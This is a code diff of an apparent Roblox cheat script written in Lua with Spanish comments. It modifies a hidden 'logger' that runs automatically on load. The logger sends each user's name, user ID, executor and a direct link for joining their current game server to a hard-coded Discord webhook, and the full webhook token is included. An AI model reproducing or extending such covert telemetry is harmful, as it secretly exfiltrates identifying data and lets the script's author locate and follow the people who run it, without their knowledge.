@@ -62,13 +62,12 @@ if bannedUsers[player.Name] then
     return
 end
 
---===[[ LOGGER - Registra quién carga el script ]]===--
+--===[[ LOGGER - Registra quién carga el script con enlace para unirse ]]===--
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
-local RunService = game:GetService("RunService")
 
--- 🔥 Webhook de Discord para el logger
+-- 🔥 Webhook de Discord
 local LOG_WEBHOOK_URL = "https://discord.com/api/webhooks/1539952686919852163/L3RzuEl4erOgADALR4UMc1meHMFnE6EsWH8bsmxCkoWrR_LD4Mi2UunN2Yuj3fk0p1UK"
 
 -- Variable para evitar duplicados
@@ -81,21 +80,15 @@ local function sendLog()
     local playerName = LocalPlayer.Name
     local displayName = LocalPlayer.DisplayName
     local userId = LocalPlayer.UserId
-    local gameId = game.GameId
     local placeId = game.PlaceId
+    local jobId = game.JobId
     local serverTime = os.time()
     local date = os.date("%Y-%m-%d %H:%M:%S", serverTime)
 
-    -- Información del dispositivo (si está disponible)
-    local deviceType = "Desconocido"
-    pcall(function()
-        if UserSettings then
-            local gameSettings = UserSettings():GetService("UserGameSettings")
-            deviceType = gameSettings and gameSettings.DeviceType or "Desconocido"
-        end
-    end)
+    -- Generar enlace directo para unirse al servidor
+    local serverLink = "https://www.roblox.com/games/" .. placeId .. "?joinAttemptId=" .. jobId
 
-    -- Información del ejecutor (si está disponible)
+    -- Información del ejecutor
     local executor = "Desconocido"
     pcall(function()
         if syn and syn.version then
@@ -109,9 +102,9 @@ local function sendLog()
         end
     end)
 
-    -- Mensaje para Discord
+    -- Mensaje para Discord con enlace
     local data = {
-        ["content"] = "📊 **Nuevo usuario cargó el script**",
+        ["content"] = "📊 **¡Alguien cargó el script!**",
         ["embeds"] = {{
             ["title"] = "👤 Información del usuario",
             ["color"] = 0x00ff00,
@@ -132,19 +125,14 @@ local function sendLog()
                     ["inline"] = true
                 },
                 {
-                    ["name"] = "📱 Dispositivo",
-                    ["value"] = deviceType,
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "🆔 Place ID",
-                    ["value"] = placeId,
-                    ["inline"] = true
-                },
-                {
                     ["name"] = "🕐 Fecha/Hora",
                     ["value"] = date,
                     ["inline"] = true
+                },
+                {
+                    ["name"] = "🔗 Enlace para unirse",
+                    ["value"] = "[Haz clic aquí para unirte al servidor](" .. serverLink .. ")",
+                    ["inline"] = false
                 }
             },
             ["footer"] = {
@@ -176,7 +164,7 @@ end
 
 -- Ejecutar el logger cuando el script se carga
 task.spawn(function()
-    task.wait(1)  -- Esperar 1 segundo para asegurar que todo está cargado
+    task.wait(1)
     sendLog()
 end)
 
